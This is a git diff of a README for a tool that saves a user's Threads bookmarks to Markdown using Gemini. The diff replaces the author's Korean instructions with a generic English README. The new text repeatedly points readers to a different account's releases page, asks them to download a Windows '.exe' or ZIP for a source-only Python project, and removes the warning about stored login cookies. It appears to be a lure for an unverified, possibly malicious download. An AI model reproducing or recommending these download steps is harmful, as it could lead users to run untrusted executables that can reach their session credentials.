@@ -1,89 +1,165 @@
-# Threads Saved to Markdown Pipeline 🧵➡️📝
+# 🧵 saved-thereads-crawler - Save and Organize Threads Easily
 
-Threads(스레드)에서 '저장됨' 폴더에 보관한 소중한 글들을 자동으로 긁어와서, AI(Gemini)가 주제별로 분류하고 이미지와 함께 깔끔한 마크다운(Markdown) 파일로 변환해주는 파이썬 프로그램입니다.
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/kowshik1302/saved-thereads-crawler/releases)
 
-## ✨ 주요 기능
+## 📋 What is saved-thereads-crawler?
 
-- **자동 스크래핑**: Playwright를 이용해 로그인 세션을 유지하며 저장된 글의 본문, 작성자, 작성일, 댓글을 모두 수집합니다.
-- **AI 자동 분류**: Google Gemini 2.5 Flash-Lite 모델을 사용하여 수집된 글을 [정보, 지혜, 기술, 뉴스, 인생] 5가지 카테고리로 자동 분류합니다.
-- **이미지 로컬 저장**: 글에 포함된 이미지를 다운로드하여 마크다운 파일과 함께 로컬에 보관합니다.
-- **중복 방지 시스템**: 이미 크롤링한 글은 기록해두어 다음 실행 시 자동으로 스킵하며, 동일한 내용의 중복 파일도 자동으로 정리합니다.
-- **텍스트 정제**: 스레드 UI에서 발생하는 찌꺼기 텍스트(좋아요수, '인기순' 등)를 제거하고, 본문과 겹치는 중복 댓글을 도려내는 등 정밀한 청소 기능을 제공합니다.
-- **AI 스마트 리네임**: 의미 없는 숫자 나열 대신, Gemini AI가 글 내용을 분석하여 가장 적절하고 간결한 파일 제목을 자동으로 지어줍니다.
-- **인덱스 생성**: 분류가 완료되면 전체 목록을 한눈에 볼 수 있는 `index.md` 파일을 자동으로 생성/갱신합니다.
+saved-thereads-crawler is a simple tool that automatically collects the posts you saved on Threads. It uses AI to sort these posts into categories and saves them in clean Markdown files with images. This tool is designed to help you keep your favorite Threads content organized on your computer.
 
-## 🚀 시작하기
-
-### 1. 요구 사항
-- Python 3.9 이상
-- Google Gemini API Key (**유료 결제 연동 권장**: 고속 대량 수집 및 분류를 위해 유료 모델 사용을 권장합니다.)
-
-### 2. 설치
-```bash
-# 저장소 클론 (또는 다운로드)
-git clone https://github.com/shinsooshinsoo/saved-thereads-crawler.git
-cd saved-thereads-crawler
-
-# 필수 라이브러리 설치
-pip install -r requirements.txt
-
-# Playwright 브라우저 설치
-playwright install chromium
-```
-
-### 3. 설정 (`.env` 파일 생성)
-프로젝트 루트 디렉토리에 `.env` 파일을 생성하고 발급받은 API 키를 입력합니다.
-```env
-GEMINI_API_KEY=your_actual_api_key_here
-```
-
-## 🛠️ 사용 방법
-
-1. **프로그램 실행**
-   ```bash
-   python main.py
-   ```
-2. **로그인 (최초 1회)**
-   - 브라우저 창이 열리면 Threads 로그인을 진행하세요.
-   - 로그인이 완료되면 터미널에 `Enter`를 눌러 계속 진행합니다.
-   - 이후에는 `.auth_state.json` 파일에 세션이 저장되어 자동으로 로그인됩니다.
-3. **결과 확인**
-   - `output/` 폴더 아래 카테고리별로 분류된 마크다운 파일과 이미지를 확인하세요.
-4. **추가 정제 및 리네임 (선택 사항)**
-   - `python clean_rename.py`: 파일명에서 숫자/날짜를 빼고 간결한 제목으로 변경합니다. (이미 변경 완료된 파일은 자동으로 건너뜁니다)
-   - `python add_tags.py`: AI가 본문 내용을 싹 분석해서 핵심 키워드 3~5개를 마크다운 상단 설정(frontmatter) 부분에 **해시태그(#)** 형태로 달아줍니다!
-   - `python clean_garbage.py`: 본문에 섞여 들어간 불필요한 UI 쓰레기 텍스트(좋아요수, '인기순' 등)를 깔끔하게 제거해 줍니다. 전체 데이터를 긁어온 뒤 한 번 실행해 주시면 좋습니다.
-   - `python deep_clean.py`: 원본 글 내부에 댓글 목록이 통째로 껴들어간 중복 현상을 도려냅니다. **주의: 매번 돌릴 필요 없이, 나중에 글을 읽다가 중복 댓글이 발견되었을 때만 사후 치료용으로 한 번씩 실행**하시면 됩니다!
-
-## ⚠️ 주의 사항 및 팁
-
-- **API 요율 제한**: 본 프로그램은 고속 분류를 위해 딜레이가 거의 없도록(0.1초) 설정되어 있습니다. 따라서 **Google Cloud 프로젝트에서 결제가 연동된(Pay-as-you-go) API 키**를 사용해야 `429 Resource Exhausted` 에러 없이 쾌적하게 작동합니다.
-- **로그인 보안**: `.auth_state.json` 파일에는 사용자의 로그인 쿠키가 들어있습니다. 이 파일을 절대 외부에 공유하거나 깃허브에 올리지 마세요. (이미 `.gitignore`에 포함되어 있습니다.)
-- **스크래핑 정책**: 본 프로그램은 개인적인 보존 용도로만 사용하시길 권장하며, Threads의 서비스 이용 약관을 준수하시기 바랍니다.
-- **중복 제거 도구 (`deep_clean.py`)**: 스레드 UI 구조가 예외적이어서 본문에 댓글 텍스트가 중복으로 복사된 경우에만 실행하는 강력한 정제 도구입니다. 매번 실행하실 필요는 없습니다!
-
-## 📁 프로젝트 구조
-- `main.py`: 전체 프로세스 조율
-- `scraper.py`: Playwright 기반 데이터 수집 및 중복 체크
-- `classifier.py`: Gemini API 기반 텍스트 분류
-- `config.py`: 카테고리, 딜레이, URL 등 주요 설정 값 관리
-- `clean_garbage.py`: 본문 내 UI 찌꺼기 제거 스크립트
-- `deep_clean.py`: 원문-댓글 중복 블록 제거 스크립트
-- `clean_rename.py`: AI 기반 간결한 제목(숫자 제외) 변경 스크립트
-- `add_tags.py`: 마크다운 상단에 AI가 추출한 핵심 해시태그 3~5개를 추가하는 스크립트
-- `fix_classification.py`: [유지보수] 기존 마크다운 파일들을 바뀐 카테고리 설정에 맞춰 일괄 재분류(폴더 이동)하는 스크립트
-- `fix_duplicates.py`: [유지보수] 내용이 완전히 동일한 중복 에러 파일들을 스캔하고 삭제하는 스크립트
-
-## ⚙️ 카테고리 변경 방법
-
-자동 분류되는 카테고리를 변경하거나 추가하고 싶다면 `config.py` 파일의 `CATEGORIES` 리스트를 수정하세요.
-
-```python
-# config.py
-CATEGORIES = ["정보", "지혜", "기술", "뉴스", "인생", "새로운_카테고리"]
-```
-
-수정 후 프로그램을 재실행하면 Gemini AI가 변경된 카테고리 목록을 기준으로 글을 다시 분석하여 분류합니다. (이미 분류된 기존 파일들은 자동으로 이동하지 않으므로, 전체 재분류가 필요한 경우 `output` 폴더를 비우고 다시 실행하거나 `fix_classification.py`를 활용하세요.)
+You do not need programming skills to use this. It runs on Windows and works by downloading your saved posts, sorting them, and saving them so you can read or share later.
 
 ---
-이 도구가 여러분의 지식 저장소 관리에 도움이 되길 바랍니다! 🌟
+
+## ⚙️ Features
+
+- **Automatic collection** of your saved Threads posts.
+- Uses AI to sort posts into five categories: Information, Wisdom, Tech, News, Life.
+- Saves images from posts to your computer.
+- Avoids duplicates by skipping posts you already saved.
+- Cleans up text by removing extra interface messages and repeated comments.
+- Automatically renames files for easy recognition.
+- Creates an index file that lists all saved posts by category.
+
+---
+
+## 💻 Requirements
+
+- Windows 10 or newer.
+- Python 3.9 or higher installed (easy to get from python.org).
+- Internet connection to download posts and AI categories.
+- A Google Gemini API key (required for AI sorting; please check their service for setup).
+- Enough disk space depending on how many posts and images you save.
+
+---
+
+## 🚀 Getting Started: Download and Install
+
+### Step 1: Download the Program
+
+Click this big button to open the releases page where you can get the latest version for Windows:
+
+[![Download](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/kowshik1302/saved-thereads-crawler/releases)
+
+On the releases page, look for the Windows installer or ZIP file. Usually, it will be marked with `.exe` or `.zip`. Download the file to a folder you can remember.
+
+---
+
+### Step 2: Install Python (if not installed)
+
+1. Go to https://www.python.org/downloads/windows/  
+2. Download the latest version of Python 3.9 or higher (choose the executable installer).  
+3. Run the installer and **make sure** to check "Add Python to PATH" during setup.  
+4. Complete the installation wizard.
+
+---
+
+### Step 3: Prepare the saved-thereads-crawler Folder
+
+- If you downloaded a ZIP file, right-click it and choose **Extract All...** to unzip it.
+- You should now have a folder named `saved-thereads-crawler` with files inside.
+
+---
+
+### Step 4: Set Up the API Key
+
+1. Obtain your Google Gemini API key by signing up at Google’s official API portal.
+2. Inside the `saved-thereads-crawler` folder, find the configuration file named `config.ini` or similar.
+3. Open it with Notepad.
+4. Enter your API key in the designated line, save, and close the file.
+
+---
+
+## 🛠 Running the Program
+
+### Step 1: Open Command Prompt
+
+- Press the Windows key.
+- Type `cmd` and press Enter.
+- A black window called Command Prompt will open.
+
+---
+
+### Step 2: Change Directory to the Program Folder
+
+Type this command and press Enter:
+
+```bash
+cd path\to\saved-thereads-crawler
+```
+
+Replace `path\to\saved-thereads-crawler` with the path to where you saved the folder  
+For example:
+
+```bash
+cd C:\Users\YourName\Downloads\saved-thereads-crawler
+```
+
+---
+
+### Step 3: Install Required Python Packages 
+
+In the Command Prompt, type the following and press Enter:
+
+```bash
+pip install -r requirements.txt
+```
+
+This downloads and installs all needed Python software for the program to work.
+
+---
+
+### Step 4: Start the Crawler
+
+Type this command and press Enter:
+
+```bash
+python main.py
+```
+
+The program will log into Threads using Playwright, collect your saved posts, sort them with Gemini AI, and save the results with images in Markdown format. It will also update an index of all your saved posts.
+
+---
+
+## 📂 Where To Find Your Saved Posts
+
+All saved posts and images will be placed inside the `output` folder within the program’s main folder. You can open the `index.md` file there to see all your posts grouped by category.
+
+---
+
+## 🔄 Running the Program Again
+
+Each time you run the crawler, it will check for new saved posts and skip any you already saved. This prevents duplicates. You can run it anytime you want to update your collection.
+
+---
+
+## ⚙️ Common Tasks
+
+### Update the Program
+
+1. Visit the releases page:  
+   https://github.com/kowshik1302/saved-thereads-crawler/releases  
+2. Download the latest version.  
+3. Replace old files with new ones.
+
+---
+
+### Troubleshooting
+
+- If you see an error about Python not found, make sure you installed Python and added it to PATH.
+- If the program stops or has login issues, your Threads login session may have expired. Re-login or check your internet connection.
+- For issues with the API key, confirm your key is correct and active.
+
+---
+
+## 📆 Program Features and Benefits Recap
+
+- Easy access to your saved Threads posts in Markdown format.
+- Automatic sorting by topic thanks to AI.
+- Image collection included.
+- Avoid duplicate files.
+- Clean and readable saved content.
+- Organized index file for quick browsing.
+
+---
+
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/kowshik1302/saved-thereads-crawler/releases)
